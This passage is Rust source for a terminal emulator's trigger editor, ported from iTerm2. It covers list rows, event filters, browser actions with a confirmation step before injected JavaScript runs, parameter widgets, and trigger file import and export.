//! Profiles > Advanced > Triggers: iTerm2's list and detail editor.

use std::cell::Cell;

thread_local! {
    /// Which row the editor selects next time it draws: set by Add Trigger... and Edit
    /// Triggers (the last row, or the first).
    static FOCUS: Cell<Option<bool>> = const { Cell::new(None) };
    /// The alerts Import and Export raised this frame (heading, text), taken by the Settings window
    /// as `Edit::Alert`, one per frame.
    static ALERTS: std::cell::RefCell<std::collections::VecDeque<(String, String)>> = const { std::cell::RefCell::new(std::collections::VecDeque::new()) };
    /// A file Export just wrote, for the Settings window to show in Explorer.
    static REVEAL: std::cell::RefCell<Option<String>> = const { std::cell::RefCell::new(None) };
}

/// The next alert the editor raised, if any.
pub fn take_alert() -> Option<(String, String)> {
    ALERTS.with(|a| a.borrow_mut().pop_front())
}

/// Whether an alert waits for a frame to carry it.
pub fn alerts_pending() -> bool {
    ALERTS.with(|a| !a.borrow().is_empty())
}

/// The file an Export wrote, to show in Explorer.
pub fn take_reveal() -> Option<String> {
    REVEAL.with(|r| r.borrow_mut().take())
}

thread_local! {
    /// The workgroups the Enter Workgroup pop-up lists, (id, name), decoded from the stored value
    /// the last time it changed (the Settings window draws every frame).
    static WORKGROUPS: std::cell::RefCell<(String, Vec<(String, String)>)> = const { std::cell::RefCell::new((String::new(), Vec::new())) };
}

/// The configured workgroups as (id, name), from the stored "Workgroups" value (`EWT:availableWorkgroups`).
/// A value that does not decode lists none, as the model does.
pub fn workgroup_choices(raw: &str) -> Vec<(String, String)> {
    WORKGROUPS.with(|c| {
        let mut c = c.borrow_mut();
        if c.0 != raw {
            let list = if raw.trim().is_empty() { Vec::new() } else { crate::workgroup::decode(raw).unwrap_or_default() };
            *c = (raw.to_string(), list.into_iter().map(|w| (w.unique_identifier, w.name)).collect());
        }
        c.1.clone()
    })
}

/// Most alerts one Import raises (a folder of broken files must not queue windows forever).
const MAX_ALERTS: usize = 8;

fn push_alert(heading: &str, text: String) {
    ALERTS.with(|a| {
        let mut a = a.borrow_mut();
        if a.len() < MAX_ALERTS {
            a.push_back((heading.to_string(), text));
        }
    });
}

/// Add Trigger...: the editor shows the new (last) trigger.
pub fn focus_last() {
    FOCUS.with(|f| f.set(Some(true)));
}

/// Edit Triggers: the editor shows the first trigger.
pub fn focus_first() {
    FOCUS.with(|f| f.set(Some(false)));
}

/// The row the editor should select now, once.
pub fn take_focus(len: usize) -> Option<usize> {
    let f = FOCUS.with(|f| f.take())?;
    (len > 0).then(|| if f { len - 1 } else { 0 })
}

use alacritty_terminal::vte::ansi::Rgb;

use crate::profile::Profile;
use crate::triggers::{self, ActionInfo, Kind, Trigger};

/// How a trigger shows in the list.
#[derive(Clone, Debug, PartialEq)]
pub struct Row {
    pub name: String,
    pub detail: String,
    pub faint: bool,
}

/// An action's menu title, with the milestone that brings it when it is not here yet.
pub fn action_label(a: &ActionInfo) -> String {
    match a.later {
        Some(0) => format!("{} (later)", a.title),
        Some(m) => format!("{} (milestone {m})", a.title),
        None => a.title.to_string(),
    }
}

/// An event's menu title, with the milestone that brings it when it is not here yet.
pub fn event_label(e: crate::trigger_events::EventKind) -> String {
    match e.later() {
        Some(m) => format!("{} (milestone {m}c)", e.name()),
        None => e.name().to_string(),
    }
}

/// An event's filter fields (iTerm2's eventParams). True when one changed.
fn event_params(ui: &mut egui::Ui, kind: crate::trigger_events::EventKind, t: &mut Trigger) -> bool {
    use crate::trigger_events::EventKind as E;
    let mut params = t.extra.get("eventParams").and_then(|v| v.as_table()).cloned().unwrap_or_default();
    let mut changed = false;
    let text = |ui: &mut egui::Ui, key: &str, label: &str, hint: &str, params: &mut toml::Table| {
        let mut v = params.get(key).and_then(|v| v.as_str()).unwrap_or("").to_string();
        ui.label(label);
        let c = ui.add(egui::TextEdit::singleline(&mut v).hint_text(hint).desired_width(300.0)).changed();
        ui.end_row();
        if c {
            params.insert(key.into(), v.into());
        }
        c
    };
    let number = |ui: &mut egui::Ui, key: &str, label: &str, default: f64, params: &mut toml::Table| {
        let mut v = crate::trigger_events::param_secs(Some(params), key, default);
        ui.label(label);
        let c = ui.add(egui::DragValue::new(&mut v).range(1.0..=86400.0).suffix(" s")).changed();
        ui.end_row();
        if c {
            params.insert(key.into(), toml::Value::Float(v));
        }
        c
    };
    match kind {
        E::CommandFinished => changed |= text(ui, "exitCodeFilter", "Exit code:", "* any, 0, !0, or a number", &mut params),
        E::DirectoryChanged => changed |= text(ui, "directoryRegex", "Directory:", "Regular expression (empty: any)", &mut params),
        E::HostChanged => changed |= text(ui, "hostRegex", "Host:", "Regular expression (empty: any)", &mut params),
        E::UserChanged => changed |= text(ui, "userRegex", "User:", "Regular expression (empty: any)", &mut params),
        E::Idle | E::ActivityAfterIdle => changed |= number(ui, "timeout", "Quiet for:", 30.0, &mut params),
        E::LongRunningCommand => {
            changed |= number(ui, "threshold", "Running for:", 60.0, &mut params);
            changed |= text(ui, "commandRegex", "Command:", "Regular expression (empty: any)", &mut params);
        }
        E::CustomEscapeSequence => changed |= text(ui, "sequenceId", "Sequence id:", "The id= the program sends", &mut params),
        E::NotificationPosted => changed |= text(ui, "messageRegex", "Message:", "Regular expression (empty: any)", &mut params),
        E::ProgressBarChanged => {
            let cur = params.get("progressBarFilter").and_then(|v| v.as_str()).unwrap_or("*").to_string();
            ui.label("When:");
            egui::ComboBox::from_id_salt("trigger-progress").selected_text(match cur.as_str() {
                "appeared" => "Appeared",
                "disappeared" => "Disappeared",
                _ => "Either",
            }).show_ui(ui, |ui| {
                for (label, v) in [("Either", "*"), ("Appeared", "appeared"), ("Disappeared", "disappeared")] {
                    if ui.selectable_label(cur == v, label).clicked() {
                        params.insert("progressBarFilter".into(), v.into());
                        changed = true;
                    }
                }
            });
            ui.end_row();
        }
        E::VariableChanged => {
            changed |= text(ui, "variableName", "Variable:", "user.name", &mut params);
            changed |= text(ui, "variableValueRegex", "Value:", "Regular expression (empty: any)", &mut params);
        }
        E::JobStarted | E::JobEnded => changed |= text(ui, "jobName", "Job:", "claude", &mut params),
        E::PromptDetected | E::SessionEnded | E::BellReceived => {}
    }
    if changed {
        t.extra.insert("eventParams".into(), toml::Value::Table(params));
    }
    changed
}

/// iTerm2's list row: the name, then Instant, the job, `/regex/`, and the action with its
/// parameter; disabled rows faint.
pub fn row(t: &Trigger) -> Row {
    row_with(t, &[])
}

/// `row`, with the configured workgroups so an Enter Workgroup trigger shows the workgroup's name
/// (`EWT:description`) and not its id.
pub fn row_with(t: &Trigger, workgroups: &[(String, String)]) -> Row {
    if triggers::is_browser_action(&t.action) {
        return browser_row(t);
    }
    let mut detail = String::new();
    if t.instant {
        detail.push_str("Instant. ");
    }
    if !t.job.is_empty() {
        detail.push_str(&format!("Job: {} ", t.job));
    }
    let action = triggers::action_info(&t.action).map_or_else(|| format!("{} (not in Termurion)", t.action), action_label);
    match crate::trigger_events::EventKind::from_match_type(t.match_type) {
        Some(e) => detail.push_str(&format!("Event: {} {action}", event_label(e))),
        None => detail.push_str(&format!("/{}/ {action}", t.regex)),
    }
    if t.action == "iTermEnterWorkgroupTrigger" {
        // The stored id is never shown: the label is the workgroup's name, "(unset)" or "(missing)".
        detail.push(' ');
        detail.push_str(&triggers::enter_workgroup_label(&t.parameter, workgroups));
    } else if !t.parameter.is_empty() {
        detail.push(' ');
        detail.push_str(&t.parameter.replace('\u{1}', " "));
    }
    Row { name: t.name.clone(), detail, faint: !t.enabled }
}

/// The Match Against pop-up (`ATV:806-812`): a browser profile offers the page URL and content too.
pub fn match_types(browser: bool) -> Vec<(&'static str, i64)> {
    let mut v = vec![("Regular Expression", 0)];
    if browser {
        v.push(("URL", triggers::URL_REGEX));
        v.push(("Page Content", triggers::PAGE_CONTENT_REGEX));
    }
    v
}

/// Whether the Match Against pop-up can be changed for this action: every browser action allows
/// one match type (`ATV:268-269`).
pub fn match_type_enabled(class: &str) -> bool {
    !triggers::is_browser_action(class)
}

pub const CONTENT_REGEX_LABEL: &str = "Content Regex:";
/// The key a Page Content trigger keeps its content regex under (`TRG:23`); it travels in `extra`.
pub const CONTENT_REGEX_KEY: &str = "contentregex";

/// The label over the regex field: in a browser, Page Content's first regex is the URL's (`ATV:1879-1884`).
pub fn regex_label(browser: bool, match_type: i64) -> &'static str {
    if browser && match_type == triggers::PAGE_CONTENT_REGEX {
        "URL Regex:"
    } else {
        "Regular Expression:"
    }
}

/// What "+" adds in a browser profile: index 0 of the sorted browser list (`TC:481-490`).
pub fn browser_default() -> Trigger {
    let a = &triggers::BROWSER_CATALOG[0];
    Trigger { regex: String::new(), action: a.class.into(), parameter: String::new(), instant: false, enabled: true, name: String::new(), job: String::new(), match_type: 0, extra: toml::Table::new() }
}

/// Highlight Text's stored `text;background` (`HGT:47-60`); an unset side is empty.
pub fn browser_colors_param(fg: Option<Rgb>, bg: Option<Rgb>) -> String {
    format!("{};{}", fg.map(hex).unwrap_or_default(), bg.map(hex).unwrap_or_default())
}

/// A stored Highlight color as a picker color: "#rrggbb", or a "p3#" color approximated by its
/// high bytes. Anything else is unset.
fn stored_rgb(s: &str) -> Option<Rgb> {
    let ok = |h: &str, n: usize| h.len() == n && h.bytes().all(|b| b.is_ascii_hexdigit());
    let byte = |h: &str, i: usize, w: usize| u8::from_str_radix(&h[i * w..i * w + 2], 16).ok();
    if let Some(h) = s.strip_prefix('#') {
        return (ok(h, 6)).then(|| Rgb { r: byte(h, 0, 2).unwrap_or(0), g: byte(h, 1, 2).unwrap_or(0), b: byte(h, 2, 2).unwrap_or(0) });
    }
    let h = s.strip_prefix("p3#")?;
    ok(h, 12).then(|| Rgb { r: byte(h, 0, 4).unwrap_or(0), g: byte(h, 1, 4).unwrap_or(0), b: byte(h, 2, 4).unwrap_or(0) })
}

/// Picking a browser action (`TC`): its fixed match type, and the parameter set to the action's
/// default (Reload "60", Inject "console.log('Testing');", Hyperlink "https://\\0", Highlight white
/// on red, the first workgroup). An action that runs script, reloads or changes the workgroup is
/// left turned off until the person confirms it (`enable_warning`).
pub fn pick_browser_action(t: &mut Trigger, class: &str, interpolated: bool, workgroups: &[(String, String)]) {
    let Some(info) = triggers::browser_action_info(class) else { return };
    t.action = info.class.to_string();
    t.match_type = triggers::browser_match_type(info.class).unwrap_or(triggers::URL_REGEX);
    t.parameter = match info.class {
        "ReloadBrowserTrigger" => "60".into(),
        "InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger" => "console.log('Testing');".into(),
        "iTerm2SharedARC.HyperlinkBrowserTrigger" => if interpolated { "https://\\(match0)" } else { "https://\\0" }.into(),
        "iTerm2SharedARC.HighlightBrowserTrigger" => browser_colors_param(Some(Rgb { r: 255, g: 255, b: 255 }), Some(Rgb { r: 255, g: 0, b: 0 })),
        "iTermEnterWorkgroupBrowserTrigger" => triggers::effective_workgroup("", workgroups).unwrap_or_default(),
        _ => String::new(),
    };
    if needs_confirm(info.class) {
        t.enabled = false;
    }
}

/// The browser actions the editor makes the person confirm before they are turned on: script in
/// the page, reload, and starting or ending a workgroup.
fn needs_confirm(class: &str) -> bool {
    matches!(
        triggers::browser_action_info(class).map(|a| a.class),
        Some("InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger" | "ReloadBrowserTrigger" | "iTermEnterWorkgroupBrowserTrigger" | "iTermExitWorkgroupBrowserTrigger")
    )
}

/// What turning this trigger on will do, shown in the one confirm (None: no confirm). Every
/// stored text goes through `display_text`, bounded. An Inject script is not in this text: the
/// confirm shows all of it (`enable_script`) and Turn On waits until it was read to the end. An
/// Enter Workgroup names the workgroup it enters (`workgroups`: (id, name)).
pub fn enable_warning(t: &Trigger, workgroups: &[(String, String)]) -> Option<String> {
    if !needs_confirm(&t.action) {
        return None;
    }
    let shown = |s: &str, n: usize| crate::inert_files::display_text(s, n, false);
    let title = triggers::browser_action_info(&t.action).map_or("this action", |a| a.title);
    let on = match t.match_type {
        triggers::PAGE_CONTENT_REGEX => format!("every page whose URL matches /{}/ and whose text matches /{}/", shown(&t.regex, 200), shown(t.extra.get(CONTENT_REGEX_KEY).and_then(|v| v.as_str()).unwrap_or(""), 200)),
        _ if t.regex.is_empty() => "every page".to_string(),
        _ => format!("every page whose URL matches /{}/", shown(&t.regex, 200)),
    };
    let what = match t.action.as_str() {
        "InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger" => format!("run the JavaScript below ({} characters, all of it shown) inside the page, exactly as written; the text it matched is given to it only as data in the list `captures`, never pasted into it", t.parameter.chars().count()),
        "ReloadBrowserTrigger" => format!("reload the page after {} seconds, again each time it matches", shown(&t.parameter, 40)),
        "iTermEnterWorkgroupBrowserTrigger" => format!("enter the workgroup \u{201c}{}\u{201d} and start what it starts", triggers::enter_workgroup_label(&t.parameter, workgroups)),
        _ => "exit the workgroup".to_string(),
    };
    Some(format!("{title} will {what}, on {on}. Turn it on only if you wrote it or trust where it came from."))
}

/// The whole script an Inject Javascript trigger would run, as the person reads it (hidden and
/// bidirectional characters dropped, line breaks kept), for the confirm's scroll area. None for any
/// other action.
pub fn enable_script(t: &Trigger) -> Option<String> {
    matches!(triggers::browser_action_info(&t.action).map(|a| a.class), Some("InjectJavascriptContentTrigger" | "InjectJavascriptURLTrigger"))
        .then(|| crate::inert_files::display_text(&t.parameter, triggers::MAX_PARAMETER, true))
}

/// A browser trigger's list row: `/url regex/ /content regex/ Action parameter`; Instant does not
/// exist in a browser. Every stored text goes through `display_text`.
pub fn browser_row(t: &Trigger) -> Row {
    let shown = |s: &str| crate::inert_files::display_text(s, 200, false);
    let mut detail = String::new();
    if !t.job.is_empty() {
        detail.push_str(&format!("Job: {} ", shown(&t.job)));
    }
    detail.push_str(&format!("/{}/ ", shown(&t.regex)));
    if t.match_type == triggers::PAGE_CONTENT_REGEX {
        detail.push_str(&format!("/{}/ ", shown(t.extra.get(CONTENT_REGEX_KEY).and_then(|v| v.as_str()).unwrap_or(""))));
    }
    let info = triggers::browser_action_info(&t.action);
    detail.push_str(&info.map_or_else(|| format!("{} (not in Termurion)", shown(&t.action)), action_label));
    if info.is_some_and(|a| a.kind == Kind::BrowserColors) {
        let (fg, bg) = triggers::browser_colors(&t.parameter);
        for (label, c) in [(" Text: ", fg), (" Background: ", bg)] {
            if let Some(c) = c {
                detail.push_str(label);
                detail.push_str(&shown(&c));
            }
        }
    } else if !t.parameter.is_empty() {
        detail.push(' ');
        detail.push_str(&shown(&t.parameter.replace('\u{1}', " ")));
    }
    Row { name: shown(&t.name), detail, faint: !t.enabled }
}

fn hex(c: Rgb) -> String {
    format!("#{:02x}{:02x}{:02x}", c.r, c.g, c.b)
}

pub fn two_colors(fg: Option<Rgb>, bg: Option<Rgb>) -> String {
    format!("{{{},{}}}", fg.map(hex).unwrap_or_default(), bg.map(hex).unwrap_or_default())
}

pub fn two_strings(a: &str, b: &str) -> String {
    format!("{a}\u{1}{b}")
}

pub fn split_two(v: &str) -> (String, String) {
    let (a, b) = v.split_once('\u{1}').unwrap_or((v, ""));
    (a.to_string(), b.to_string())
}

pub fn tab_status(dot: &str, text: &str, status: &str) -> String {
    format!("{dot}\u{1}{text}\u{1}{status}")
}

pub fn split_tab_status(v: &str) -> (String, String, String) {
    let mut p = v.splitn(3, '\u{1}');
    (p.next().unwrap_or("").to_string(), p.next().unwrap_or("").to_string(), p.next().unwrap_or("").to_string())
}

pub fn setting(key: &str, on: bool) -> String {
    format!("{key}\u{1}{}", if on { 1 } else { 0 })
}

pub fn split_setting(v: &str) -> (String, bool) {
    let (k, on) = split_two(v);
    (k, on.trim() == "1")
}

fn to_color32(c: Rgb) -> egui::Color32 {
    egui::Color32::from_rgb(c.r, c.g, c.b)
}

fn from_color32(c: egui::Color32) -> Rgb {
    Rgb { r: c.r(), g: c.g(), b: c.b() }
}

/// A color that may be unset: a check box, then the picker.
fn optional_color(ui: &mut egui::Ui, label: &str, color: &mut Option<Rgb>, default: Rgb) -> bool {
    let mut changed = false;
    let mut on = color.is_some();
    if ui.checkbox(&mut on, label).changed() {
        *color = on.then_some(color.unwrap_or(default));
        changed = true;
    }
    if let Some(c) = color.as_mut() {
        let mut c32 = to_color32(*c);
        if ui.color_edit_button_srgba(&mut c32).changed() {
            *c = from_color32(c32);
            changed = true;
        }
    }
    changed
}

/// The parameter widget for an action's kind. True when it changed.
fn parameter(ui: &mut egui::Ui, info: &ActionInfo, value: &mut String, workgroups: &[(String, String)]) -> bool {
    match info.kind {
        Kind::Workgroup => {
            // The pop-up of the configured workgroups by name; an empty parameter shows (and
            // enters) the first, as the pop-up does (`EWT:effectiveID`).
            let shown = triggers::enter_workgroup_label(value, workgroups);
            let current = triggers::effective_workgroup(value, workgroups);
            let mut changed = false;
            egui::ComboBox::from_id_salt("trigger-workgroup").selected_text(shown).width(360.0).show_ui(ui, |ui| {
                for (id, name) in triggers::sorted_workgroups(workgroups) {
                    let label = crate::inert_files::display_text(if name.is_empty() { "Untitled" } else { &name }, 128, false);
                    if ui.selectable_label(current.as_deref() == Some(id.as_str()), label).clicked() {
                        *value = id;
                        changed = true;
                    }
                }
            });
            changed
        }
        Kind::None => {
            ui.weak("No parameter");
            false
        }
        Kind::Text => ui.add(egui::TextEdit::singleline(value).hint_text(info.placeholder).desired_width(360.0)).changed(),
        Kind::Popup(choices) => {
            let current: i64 = value.trim().parse().unwrap_or(choices[0].1);
            let title = choices.iter().find(|(_, n)| *n == current).map_or(choices[0].0, |(t, _)| t);
            let mut changed = false;
            egui::ComboBox::from_id_salt("trigger-popup").selected_text(title).show_ui(ui, |ui| {
                for (t, n) in choices {
                    if ui.selectable_label(*n == current, *t).clicked() {
                        *value = n.to_string();
                        changed = true;
                    }
                }
            });
            changed
        }
        Kind::TwoColors => {
            let (mut fg, mut bg) = crate::trigger_eval::highlight_colors(value);
            let mut changed = false;
            ui.horizontal(|ui| {
                changed |= optional_color(ui, "Text color", &mut fg, Rgb { r: 255, g: 255, b: 255 });
                changed |= optional_color(ui, "Background color", &mut bg, Rgb { r: 255, g: 0, b: 0 });
            });
            if changed {
                *value = two_colors(fg, bg);
            }
            changed
        }
        Kind::TwoStrings => {
            let (mut a, mut b) = split_two(value);
            let mut changed = false;
            ui.horizontal(|ui| {
                changed |= ui.add(egui::TextEdit::singleline(&mut a).hint_text("Variable name").desired_width(140.0)).changed();
                changed |= ui.add(egui::TextEdit::singleline(&mut b).hint_text(info.placeholder).desired_width(200.0)).changed();
            });
            if changed {
                *value = two_strings(&a, &b);
            }
            changed
        }
        Kind::TabStatus => {
            let (dot, text, mut status) = split_tab_status(value);
            let mut dot = crate::tabstatus::xterm_color(&dot);
            let mut text = crate::tabstatus::xterm_color(&text);
            let mut changed = false;
            ui.horizontal(|ui| {
                egui::ComboBox::from_id_salt("trigger-tab-status").selected_text(match status.as_str() {
                    "wait" => "Waiting",
                    "idle" => "Idle",
                    _ => "Working",
                }).show_ui(ui, |ui| {
                    for (label, v) in [("Working", "work"), ("Waiting", "wait"), ("Idle", "idle")] {
                        if ui.selectable_label(status == v, label).clicked() {
                            status = v.to_string();
                            changed = true;
                        }
                    }
                });
                changed |= optional_color(ui, "Dot", &mut dot, Rgb { r: 0, g: 200, b: 0 });
                changed |= optional_color(ui, "Text", &mut text, Rgb { r: 255, g: 255, b: 255 });
            });
            if changed {
                *value = tab_status(&dot.map(hex).unwrap_or_default(), &text.map(hex).unwrap_or_default(), if status.is_empty() { "work" } else { &status });
            }
            changed
        }
        Kind::Accounts => {
            // The password manager's cached display strings, never fetched here (iTerm2's
            // pop-up of `cachedCombinedAccountNames`). The placeholder stands for no account.
            let choices = crate::pwm_prompt::trigger_choices(&crate::pwm_prompt::cached_names(), value);
            let shown = crate::pwm_prompt::trigger_param(value).unwrap_or_else(|| crate::pwm_prompt::UNLOCK.to_string());
            let mut changed = false;
            egui::ComboBox::from_id_salt("trigger-accounts").selected_text(shown.clone()).width(360.0).show_ui(ui, |ui| {
                for name in choices {
                    if ui.selectable_label(name == shown, &name).clicked() {
                        *value = name;
                        changed = true;
                    }
                }
            });
            changed
        }
        Kind::Setting => {
            let (mut key, mut on) = split_setting(value);
            let mut changed = false;
            ui.horizontal(|ui| {
                let label = crate::schema::find(&key).map_or(key.clone(), |s| s.label.clone());
                egui::ComboBox::from_id_salt("trigger-setting").selected_text(label).width(260.0).show_ui(ui, |ui| {
                    for s in crate::schema::profile().iter().filter(|s| s.kind == crate::schema::Kind::Bool) {
                        if ui.selectable_label(s.key == key, &s.label).clicked() {
                            key = s.key.clone();
                            changed = true;
                        }
                    }
                });
                changed |= ui.checkbox(&mut on, "On").changed();
            });
            if changed {
                *value = setting(&key, on);
            }
            changed
        }
        Kind::BrowserColors => {
            let (f, b) = triggers::browser_colors(value);
            let (mut fg, mut bg) = (f.as_deref().and_then(stored_rgb), b.as_deref().and_then(stored_rgb));
            let mut changed = false;
            ui.horizontal(|ui| {
                changed |= optional_color(ui, "Text color", &mut fg, Rgb { r: 255, g: 255, b: 255 });
                changed |= optional_color(ui, "Background color", &mut bg, Rgb { r: 255, g: 0, b: 0 });
            });
            if changed {
                *value = browser_colors_param(fg, bg);
            }
            changed
        }
    }
}

/// The editor's Import (`TriggerController.m:1171-1203`): each file's text parsed in order and its
/// triggers merged into the stored list; each failure is an alert (heading, text), and a file that
/// failed adds nothing. `files` are (shown name, the text or the reason it could not be read).
pub fn import_into(stored: Option<&toml::Value>, files: &[(String, Result<String, String>)]) -> (toml::Value, Vec<(String, String)>) {
    use crate::trigger_file as tf;
    let mut list = stored.cloned().unwrap_or_else(|| toml::Value::Array(Vec::new()));
    let mut alerts = Vec::new();
    for (name, text) in files {
        match text {
            Err(e) => alerts.push((tf::IMPORT_FAILED_HEADING.to_string(), tf::load_error_text(name, e))),
            Ok(text) => match tf::parse(text, name) {
                Ok(imported) => {
                    list = tf::add_triggers(Some(&list), &imported);
                    let off = tf::off_count(&imported);
                    if off > 0 {
                        alerts.push((tf::IMPORTED_OFF_HEADING.to_string(), tf::off_text(off)));
                    }
                }
                Err(e) => alerts.push((e.heading.to_string(), e.text)),
            },
        }
    }
    (list, alerts)
}

/// The text of a trigger file the person picked: at most `MAX_FILE` bytes, read through the judge's
/// type, valid UTF-8 (`TriggerController.m:580-600`). The error is the reason, for "While loading".
pub fn read_text(p: &crate::localfs::LocalPath) -> Result<String, String> {
    use std::io::Read;
    let file = crate::localfs::open(p).map_err(|e| e.to_string())?;
    let mut bytes = Vec::new();
    file.take(crate::trigger_file::MAX_FILE as u64 + 1).read_to_end(&mut bytes).map_err(|e| e.to_string())?;
    if bytes.len() > crate::trigger_file::MAX_FILE {
        return Err("the file is too large for a trigger file".to_string());
    }
    String::from_utf8(bytes).map_err(|_| "the file is not valid UTF-8".to_string())
}

/// Writes an exported file: a new file readable by this user alone, made beside the target and moved
/// over it, so an existing file (or a link planted there) is replaced as itself, never written
/// through. The path is the person's pick.
pub fn write_export(path: &crate::localfs::LocalPath, text: &str) -> std::io::Result<()> {
    let bad = || std::io::Error::new(std::io::ErrorKind::InvalidInput, "this is not a file name");
    let name = path.path().file_name().ok_or_else(bad)?.to_os_string();
    let folder = path.parent().ok_or_else(bad)?;
    let target = folder.unfollowed(&name).ok_or_else(bad)?;
    #[cfg(windows)]
    {
        use std::io::Write;
        let mut temp_name = std::ffi::OsString::from(".");
        temp_name.push(&name);
        temp_name.push(format!(".{}.tmp", std::process::id()));
        let temp = folder.unfollowed(&temp_name).ok_or_else(bad)?;
        match crate::localfs::remove_unfollowed(&temp) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(e),
        }
        let written = crate::localfs::create_owner_only(&temp).and_then(|mut f| f.write_all(text.as_bytes()).and_then(|()| f.sync_all()));
        let moved = written.and_then(|()| crate::localfs::rename_unfollowed(&temp, &target));
        if moved.is_err() {
            let _ = crate::localfs::remove_unfollowed(&temp);
        }
        moved
    }
    #[cfg(not(windows))]
    {
        let _ = target;
        crate::localfs::write(path, text)
    }
}

/// "Export to File" (`TriggerController.m:1139-1169`): the trigger as a one-element array in a file
/// the person names. A failure is an "Export Failed" alert; a file written is shown in Explorer.
fn export_one(t: &Trigger) {
    use crate::trigger_file as tf;
    let mut table = t.to_table();
    for k in ["name", "job"] {
        if table.get(k).and_then(|v| v.as_str()).is_some_and(str::is_empty) {
            table.remove(k);
        }
    }
    let text = match tf::export_file_text(&table) {
        Ok(text) => text,
        Err(e) => return push_alert(tf::EXPORT_FAILED_HEADING, e),
    };
    let dialog = rfd::FileDialog::new().set_title(tf::EXPORT_TITLE).set_file_name(format!("triggers.{}", tf::EXTENSION)).add_filter("iTerm2 triggers", &[tf::EXTENSION]);
    let Some(path) = crate::localfs::save_file(dialog) else { return };
    let shown = crate::inert_files::shown_name(&path.path().file_name().map_or_else(String::new, |n| n.to_string_lossy().into_owned()));
    match write_export(&path, &text) {
        Ok(()) => REVEAL.with(|r| *r.borrow_mut() = Some(path.path().to_string_lossy().into_owned())),
        Err(e) => push_alert(tf::EXPORT_FAILED_HEADING, tf::save_error_text(&shown, &e.to_string())),
    }
}

/// The Import button (`TriggerController.m:1171-1203`): files the person picks, each read and merged
/// into the profile's list. True when the list changed.
fn import_button(profile: &mut Profile) -> bool {
    use crate::trigger_file as tf;
    let dialog = rfd::FileDialog::new().set_title(tf::IMPORT_TITLE).add_filter("iTerm2 triggers", &[tf::EXTENSION]);
    let files: Vec<(String, Result<String, String>)> = crate::localfs::pick_files(dialog)
        .iter()
        .map(|p| (crate::inert_files::shown_name(&p.path().file_name().map_or_else(String::new, |n| n.to_string_lossy().into_owned())), read_text(p)))
        .collect();
    let stored = profile.get("Triggers");
    let (merged, alerts) = import_into(stored.as_ref(), &files);
    for (heading, text) in alerts {
        push_alert(&heading, text);
    }
    let changed = stored.as_ref() != Some(&merged) && !(stored.is_none() && merged.as_array().is_some_and(Vec::is_empty));
    if changed {
        profile.set("Triggers", merged.clone());
        let dropped = tf::dropped_by_limit(&merged, profile.get("Triggers").as_ref());
        if dropped > 0 {
            push_alert(tf::NOT_IMPORTED_HEADING, tf::not_kept_text(dropped));
        }
    }
    changed
}

/// The Triggers editor: the list with + and -, and the selected trigger's fields. True when
/// the profile's triggers changed.
pub fn editor(ui: &mut egui::Ui, profile: &mut Profile, workgroups: &[(String, String)]) -> bool {
    let mut list = profile.get("Triggers").map(|v| triggers::parse_list(&v)).unwrap_or_default();
    let interpolated = profile.bool("Triggers Use Interpolated Strings");
    let browser = crate::browser::is_browser(&profile.string("Custom Command"));
    let confirm_id = egui::Id::new("trigger-confirm-enable");
    let sel_id = egui::Id::new("trigger-selected");
    let mut selected: Option<usize> = take_focus(list.len()).or_else(|| ui.data(|d| d.get_temp(sel_id))).filter(|i: &usize| *i < list.len());
    let mut changed = false;
    let mut imported = false;
    ui.label(if browser { "Triggers act on pages whose address or text matches a regular expression." } else { "Triggers act on output that matches a regular expression." });
    egui::ScrollArea::vertical().max_height(220.0).id_salt("trigger-list").show(ui, |ui| {
        for (i, t) in list.iter().enumerate() {
            let r = row_with(t, workgroups);
            let text = egui::RichText::new(format!("{}  {}", if r.name.is_empty() { "(no name)" } else { &r.name }, r.detail));
            let text = if r.faint { text.weak() } else { text };
            let response = ui.selectable_label(selected == Some(i), text);
            if response.clicked() || response.secondary_clicked() {
                selected = Some(i);
            }
            // The row's menu (`TriggerController.m:1133-1135`).
            response.context_menu(|ui| {
                if ui.button(crate::trigger_file::EXPORT_TITLE).clicked() {
                    export_one(t);
                    ui.close();
                }
            });
        }
    });
    ui.horizontal(|ui| {
        if ui.button("+").clicked() {
            list.push(if browser {
                browser_default()
            } else {
                Trigger { regex: String::new(), action: "BounceTrigger".into(), parameter: "0".into(), instant: false, enabled: true, name: String::new(), job: String::new(), match_type: 0, extra: toml::Table::new() }
            });
            selected = Some(list.len() - 1);
            changed = true;
        }
        if ui.add_enabled(selected.is_some(), egui::Button::new("-")).clicked() {
            if let Some(i) = selected.take() {
                list.remove(i);
                changed = true;
            }
        }
        if ui.button(crate::trigger_file::IMPORT_TITLE).clicked() && import_button(profile) {
            // The list changed under the editor: it reads the stored one again next frame.
            imported = true;
        }
    });
    match selected {
        None => {
            ui.weak("Select one trigger to view or edit");
        }
        Some(i) => {
            let t = &mut list[i];
            ui.separator();
            egui::Grid::new("trigger-detail").num_columns(2).show(ui, |ui| {
                ui.label("Name:");
                changed |= ui.text_edit_singleline(&mut t.name).changed();
                ui.end_row();
                ui.label("Match Against:");
                let event = if browser { None } else { crate::trigger_events::EventKind::from_match_type(t.match_type) };
                if browser {
                    let types = match_types(true);
                    let shown = types.iter().find(|(_, n)| *n == t.match_type).map_or(types[0].0, |(name, _)| name);
                    let can = match_type_enabled(&t.action);
                    ui.add_enabled_ui(can, |ui| {
                        egui::ComboBox::from_id_salt("trigger-match").selected_text(shown).width(260.0).show_ui(ui, |ui| {
                            for (name, n) in &types {
                                if ui.selectable_label(t.match_type == *n, *name).clicked() {
                                    t.match_type = *n;
                                    changed = true;
                                }
                            }
                        });
                    });
                } else {
                egui::ComboBox::from_id_salt("trigger-match").selected_text(event.map_or("Regular Expression".to_string(), event_label)).width(260.0).show_ui(ui, |ui| {
                    if ui.selectable_label(event.is_none(), "Regular Expression").clicked() {
                        t.match_type = 0;
                        changed = true;
                    }
                    ui.separator();
                    // The workgroup actions need a live session: Session Ended is not offered for them.
                    let mut all = triggers::allowed_events(&t.action);
                    all.sort_by_key(|e| e.name());
                    for e in all {
                        if ui.selectable_label(event == Some(e), event_label(e)).clicked() {
                            t.match_type = e.match_type();
                            changed = true;
                        }
                    }
                });
                }
                ui.end_row();
                match event {
                    Some(e) => changed |= event_params(ui, e, t),
                    None => {
                        ui.label(regex_label(browser, t.match_type));
